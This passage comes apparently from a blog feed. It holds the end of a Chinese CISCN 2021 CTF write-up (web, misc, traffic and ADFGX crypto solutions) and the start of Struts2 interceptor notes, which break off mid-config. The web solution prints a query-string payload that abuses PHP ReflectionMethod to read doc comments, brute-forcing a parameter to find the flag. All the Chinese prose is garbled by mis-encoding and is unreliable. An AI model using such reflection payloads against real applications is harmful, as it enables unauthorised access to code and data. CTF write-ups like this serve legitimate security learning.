class="hljs-doctag">@return</span>  int</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">&#x27;User&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>);<br>var_dump(<span class="hljs-variable">$d</span>-&gt;getDocComment());<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210516141112739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æºç ä¸­æœ‰26ä¸ªå‡½æ•°ï¼Œflagåœ¨æŸä¸ªå‡½æ•°çš„æ³¨é‡Šä¸­ï¼Œæ„é€ Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment<br></code></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼Œçˆ†ç ´rbå‚æ•°çš„å€¼ï¼Œä»a-zå¼€å§‹çˆ†ç ´ï¼Œæœ€ç»ˆåœ¨qçš„æ³¨é‡Šä¸­æ‰¾åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210516141137899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h2><p>ä½¿ç”¨è„šæœ¬è¿›è¡Œgifåˆ†å¸§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_name = <span class="hljs-string">&#x27;running_pixel.gif&#x27;</span><br><span class="hljs-comment"># ä½¿ç”¨Imageæ¨¡å—çš„open()æ–¹æ³•æ‰“å¼€gifåŠ¨æ€å›¾åƒæ—¶ï¼Œé»˜è®¤æ˜¯ç¬¬ä¸€å¸§</span><br>im = Image.<span class="hljs-built_in">open</span>(file_name)<br><span class="hljs-comment"># å®šä¹‰å­˜å‚¨å›¾ç‰‡çš„æ–‡ä»¶åä¸è¯»å–çš„GIFå›¾ç‰‡åä¸€è‡´</span><br>file_save = file_name[:-<span class="hljs-number">4</span>]<br><span class="hljs-comment"># åœ¨åŒçº§ç›®å½•ä¸‹åˆ›å»ºå­˜æ”¾æ¯å¸§å›¾ç‰‡çš„æ–‡ä»¶å¤¹</span><br><span class="hljs-comment"># åˆ›å»ºä¸€çº§ç›®å½•ï¼šos.mkdir(&#x27;D:\\gif1&#x27;)   åˆ›å»ºå¤šçº§ç›®å½•ï¼šos.makedirs(&#x27;D:\\gif1\\gif1&#x27;)</span><br>os.mkdir(file_save)<br><span class="hljs-keyword">try</span>:<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># ä¿å­˜å½“å‰å¸§å›¾ç‰‡</span><br>    <span class="hljs-comment"># è·å–å½“å‰æ–‡ä»¶çš„ä½ç½®(GIFå›¾çš„å¸§æ•°)</span><br>    frame_number= im.tell()<br>    <span class="hljs-comment"># ä¿å­˜å›¾ç‰‡ï¼Œæ ¼å¼ä¸ºpng</span><br>    im.save(file_save+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-built_in">str</span>(frame_number)+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    <span class="hljs-comment"># è·å–ä¸‹ä¸€å¸§å›¾ç‰‡</span><br>    im.seek(frame_number+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">except</span> EOFError:<br>    <span class="hljs-keyword">pass</span><br>print(<span class="hljs-string">&quot;å…±:&quot;</span>, frame_number, <span class="hljs-string">&quot;å¼ å›¾ç‰‡&quot;</span>)<br></code></pre></td></tr></table></figure><p>å‚è€ƒ<a href="https://mochu.blog.csdn.net/article/details/116855242">æœ«åˆ</a>å¸ˆå‚…çš„wp</p><p>PSæ‰“å¼€æ‰“å¼€å‡ å¼ å›¾ç‰‡æŸ¥çœ‹ï¼Œæœ‰å¯ç–‘ç™½ç‚¹ï¼Œåƒç´ å—ä¸º<code>RGB: (233,233,233)</code>ï¼Œå…¶ä»–å›¾ç‰‡ä¸­ä¹Ÿå‘ç°äº†è¿™ä¸ªåƒç´ å—<br><img src="https://img-blog.csdnimg.cn/20210521203038633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æå–382å¼ å›¾ç‰‡çš„åƒç´ å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>flag_img = Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">400</span>,<span class="hljs-number">400</span>))<br><span class="hljs-comment">#mode=1 1ä½é»‘ç™½åƒç´ ï¼Œæ¯å­—èŠ‚å­˜å‚¨ä¸€ä¸ªåƒç´ </span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">381</span>):<br>    framepic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./running_pixel/<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br>    framepic = framepic.convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    width,height = framepic.size<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            <span class="hljs-keyword">if</span> framepic.getpixel((w,h)) == (<span class="hljs-number">233</span>,<span class="hljs-number">233</span>,<span class="hljs-number">233</span>):<br>                flag_img.putpixel((h,w),<span class="hljs-number">1</span>)<br><br>    flag_img.save(<span class="hljs-string">f&quot;flag_<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>æœ€åä¸€å¼ å›¾<br><img src="https://img-blog.csdnimg.cn/2021052120570322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ¹æ®å­—ç¬¦å‡ºç°é¡ºåºå¾—åˆ°ï¼š12504D0F-9DE1-4B00-87A5-A5FDD0986A00<br>æœ€ç»ˆflagä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;<br></code></pre></td></tr></table></figure><h2 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h2><p>æµé‡åŒ…æ‹–å…¥wirksharkä¸­ï¼Œå¯¼å‡ºhttpå¯¹è±¡ï¼Œå‘ç°äº†ä¸¤ä¸ªgzipå’Œä¸¤ä¸ªbræ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20210521211621458.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§£å‹flag_wrapperå¾—åˆ°â€¦<br><img src="https://img-blog.csdnimg.cn/20210521211307860.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠŠteståç¼€æ”¹ä¸ºbrï¼Œè§£å‹å¾—åˆ°testï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br>message PBResponse &#123;<br>  int32 code = 1;<br>  int64 flag_part_convert_to_hex_plz = 2;<br>  message data &#123;<br>    string junk_data = 2;<br>    string flag_part = 1;<br>  &#125;<br>  repeated data dataList = 3;<br>  int32 flag_part_plz_convert_to_hex = 4;<br>  string flag_last_part = 5;<br>&#125;<br><br>message PBRequest &#123;<br>  string cate_id = 1;<br>  int32 page = 2;<br>  int32 pageSize = 3;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹è½½è§£å‹åè¿›å…¥åˆ°binç›®å½•ï¼Œå°†ä¹‹å‰è§£å‹å‡ºæ¥çš„testæ”¹ä¸ºtest.protoå¹¶ç§»åŠ¨åˆ°binç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\protoc.exe --python_out=. test.proto<br></code></pre></td></tr></table></figure><p>å¾—åˆ°test_pb2.pyï¼ŒæŠŠè§£å‹åçš„secretä¹Ÿç§»åŠ¨åˆ°binç›®å½•<br><img src="https://img-blog.csdnimg.cn/20210521225101522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ååºåˆ—åŒ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import test_pb2<br><br>with open(<span class="hljs-string">&#x27;./secret&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>    data = f.read()<br>    target = test_pb2.PBResponse()<br>    target.ParseFromString(data)<br>    <span class="hljs-built_in">print</span>(target)<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">code: 200<br>flag_part_convert_to_hex_plz: 15100450<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;e2345&quot;</span><br>  junk_data: <span class="hljs-string">&quot;7af2c&quot;</span><br>&#125;<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;7889b0&quot;</span><br>  junk_data: <span class="hljs-string">&quot;82bc0&quot;</span><br>&#125;<br>flag_part_plz_convert_to_hex: 16453958<br>flag_last_part: <span class="hljs-string">&quot;d172a38dc&quot;</span><br></code></pre></td></tr></table></figure><p>æŠŠ15100450å’Œ16453958è½¬æ¢ä¸ºhexï¼Œå’Œå…¶ä»–hexæŒ‰é¡ºåºæ‹¼æ¥å¾—åˆ°æœ€ç»ˆflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;<br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h2><p>é™„ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX<br></code></pre></td></tr></table></figure><p><a href="https://wishingstarmoye.com/ctf/adfgx">ADFGXå¯†ç </a>ï¼Œç”¨æœ€ç»å…¸çš„å¯†ç è¡¨<code>phqgmeaynofdxkrcvszwbutil</code>ï¼Œkeyä¸ºé¢˜ç›®åå­—<code>classic</code>ï¼Œæœ€å¯æ°”çš„æ˜¯è§£å¯†æ—¶éœ€è¦å°†é™„ä»¶ä¸­çš„å†…å®¹åè½¬å¾—åˆ°å¯†æ–‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">str=<span class="hljs-string">&quot;AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX&quot;</span><br><span class="hljs-built_in">print</span>(str[::-1])<br><br><span class="hljs-comment">#XDGXDAFGADFFFFXDADGDXAGFXAGDFGAGFDFDXDAGFDAXXDAXGFGFAGGFAAAXAFAAAAADXDXXAXXDFDFDXAXDXDAAGFFDAXFFXXAFAXAXGDGXAGAAXDAAXFXAFDFGXDXDXDXDFFXDFFXDDFAGAXAAGXGXFFFFXDXAFDFFXDFGXDGFDAAXFGFDAFAXXDFDXAXA</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†è§£å¯†å¾—åˆ°flagï¼Œå¤§æ„äº†<br><img src="https://img-blog.csdnimg.cn/20210521214939316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2ä¹‹æ‹¦æˆªå™¨</title>
    <link href="/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/"/>
    <url>/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šStruts2æ¡†æ¶å­¦ä¹ ç¬”è®°ï¼ˆä¸‰ï¼‰</p> <a id="more"></a><h2 id="æ‹¦æˆªå™¨ç®€ä»‹"><a href="#æ‹¦æˆªå™¨ç®€ä»‹" class="headerlink" title="æ‹¦æˆªå™¨ç®€ä»‹"></a>æ‹¦æˆªå™¨ç®€ä»‹</h2><p>   æ‹¦æˆªå™¨ï¼ˆInterceptorï¼‰æ˜¯Struts2çš„æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼Œå®ƒå¯ä»¥åŠ¨æ€æ‹¦æˆªActionè°ƒç”¨çš„å¯¹è±¡ï¼Œç±»ä¼¼äºServletä¸­çš„è¿‡æ»¤å™¨ã€‚ Struts2çš„æ‹¦æˆªå™¨æ˜¯AOPï¼ˆAspect-Object-Programmingï¼Œé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰çš„ä¸€ç§å®ç°ç­–ç•¥ï¼Œæ˜¯å¯æ’æ‹”çš„ã€‚å®ƒå¯ä»¥ä»»æ„åœ°ç»„åˆActionæä¾›çš„é™„åŠ åŠŸèƒ½ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹Actionçš„ä»£ç ï¼Œå¼€å‘è€…åªéœ€è¦æä¾›æ‹¦æˆªå™¨çš„å®ç°ç±»ï¼Œå¹¶å°†å…¶é…ç½®åœ¨struts.xmlä¸­å³å¯ã€‚</p><p>æ¯ä¸ªæ‹¦æˆªå™¨å¯ä»¥å®Œæˆå•ä¸ªåŠŸèƒ½ã€‚ä¸åŒåŠŸèƒ½çš„æ‹¦æˆªå™¨æŒ‰ç…§ä¸€å®šçš„é¡ºåºæ’åˆ—åœ¨ä¸€èµ·å½¢æˆçš„é“¾ï¼Œå°±æ˜¯æ‹¦æˆªå™¨é“¾ã€‚æ‹¦æˆªå™¨é“¾ç»„æˆçš„é›†åˆå°±æ˜¯æ‹¦æˆªå™¨æ ˆã€‚</p><h2 id="æ‹¦æˆªå™¨é…ç½®"><a href="#æ‹¦æˆªå™¨é…ç½®" class="headerlink" title="æ‹¦æˆªå™¨é…ç½®"></a>æ‹¦æˆªå™¨é…ç½®</h2><p><strong>1.æ‹¦æˆªå™¨</strong><br>è¦æƒ³æ‹¦æˆªå™¨èµ·ä½œç”¨ï¼Œé¦–å…ˆè¦åœ¨struts.xmlæ–‡ä»¶ä¸­è¿›è¡Œé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;paramName&quot;</span>&gt;</span>paramValue<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor</span>&gt;</span><br></code></pre></td></tr></table></figure><p>nameå±æ€§ç”¨æ¥æŒ‡å®šæ‹¦æˆªå™¨çš„åç§°ï¼Œclasså±æ€§ç”¨äºæŒ‡å®šæ‹¦æˆªå™¨çš„å®ç°ç±»ã€‚å¦‚æœåœ¨å®šä¹‰æ‹¦æˆªå™¨æ—¶éœ€è¦ä¼ å…¥å‚æ•°ï¼Œè¿™æ—¶éœ€è¦ä½¿ç”¨<code>&lt;param&gt;</code>æ ‡ç­¾,å…¶ä¸­nameå±æ€§ç”¨æ¥æŒ‡å®šå‚æ•°çš„åç§°ï¼ŒparamValueè¡¨ç¤ºå‚æ•°çš„å€¼ã€‚</p><p><strong>2.æ‹¦æˆªæ ˆ</strong><br>åœ¨å®é™…å¼€å‘ä¸­ï¼Œç»å¸¸éœ€è¦åœ¨Actionæ‰§è¡Œå‰åŒæ—¶æ‰§è¡Œå¤šä¸ªæ‹¦æˆªåŠ¨ä½œï¼Œå¦‚ç”¨æˆ·ç™»å½•æ£€æŸ¥ã€ç™»å½•æ—¥å¿—è®°å½•ä»¥åŠæƒé™æ£€æŸ¥ç­‰ï¼Œè¿™æ—¶ï¼Œå¯ä»¥æŠŠå¤šä¸ªæ‹¦æˆªå™¨ç»„æˆä¸€ä¸ªæ‹¦æˆªå™¨æ ˆã€‚<br>åœ¨ä½¿ç”¨æ—¶ï¼Œå¯ä»¥å°†æ ˆå†…çš„å¤šä¸ªæ‹¦æˆªå™¨å½“æˆä¸ªæ•´ä½“æ¥å¼•ç”¨ã€‚ å½“æ‹¦æˆªå™¨æ ˆè¢«é™„åŠ åˆ°ä¸€ä¸ª Actionä¸Šæ—¶ï¼Œåœ¨æ‰§è¡ŒActionä¹‹å‰å¿…é¡»å…ˆæ‰§è¡Œæ‹¦æˆªå™¨æ ˆä¸­çš„æ¯ä¸€ä¸€ ä¸ªæ‹¦æˆªå™¨ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorStackName&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span> /&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br></code></pre></td></tr></table></figure><p>interceptorStackNameå€¼ä»£è¡¨é…ç½®çš„æ‹¦æˆªå™¨æ ˆçš„åç§°ï¼ŒinterceptorNameå€¼ä»£è¡¨æ‹¦æˆªå™¨çš„åç§°ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œä¸€ä¸ªæ‹¦æˆªå™¨æ ˆä¹Ÿå¯ä»¥åŒ…å«å¦å¤–ä¸€ä¸ªæ‹¦æˆªå™¨æ ˆï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>    <span class="hljs-comment">&lt;!--å£°æ˜æ‹¦æˆªå™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-comment">&lt;!--å®šä¹‰ä¸€ä¸ªæ‹¦æˆªå™¨æ ˆmyStackï¼Œè¯¥æ‹¦æˆªå™¨æ ˆä¸­åŒ…å«ä¸¤ä¸ªæ‹¦æˆªå™¨å’Œä¸€ä¸ªæ‹¦æˆªå™¨æ ˆ--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span> /&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨å®šä¹‰çš„æ‹¦æˆªæ ˆmyStackä¸­ï¼Œé™¤äº†å¼•ç”¨äº†ä¸¤ä¸ªè‡ªå®šä¹‰çš„æ‹¦æˆªå™¨interceptor1å’Œinterceptor2å¤–ï¼Œè¿˜å¼•ç”¨äº†ä¸€ä¸ªå†…ç½®æ‹¦æˆªå™¨æ ˆdefaultStackï¼Œä¸”è¯¥å†…ç½®æ‹¦æˆªå™¨æ ˆå¿…ä¸å¯å°‘ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--é…ç½®ç”¨æˆ·è‡ªå®šä¹‰çš„æ‹¦æˆªå™¨--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span>/&gt;</span><br>            <br>            <span class="hljs-comment">&lt;!--è‡ªå®šä¹‰æ‹¦æˆªå™¨æ ˆï¼Œæˆ‘ä»¬é…ç½®äº†è‡ªå®šä¹‰çš„æ‹¦æˆªå™¨ï¼Œé»˜è®¤çš„æ‹¦æˆªå™¨æ ˆå°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› æ­¤ï¼Œæƒ³è¦ä½¿ç”¨é»˜è®¤çš„æ‹¦æˆªå™¨åŠŸèƒ½ï¼Œå°±è¦é…ç½®è¿›æ¥--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--å¼•ç”¨é»˜è®¤çš„æ‹¦æˆªå™¨æ ˆï¼Œä¸€å®šè¦æ”¾åœ¨ç¬¬ä¸€è¡Œ--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defalutStack&quot;</span>/&gt;</span><br>                <br>                <span class="hljs-comment">&lt;!--å¼•ç”¨è‡ªå®šä¹‰çš„æ‹¦æˆªå™¨--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>        <br>        <span 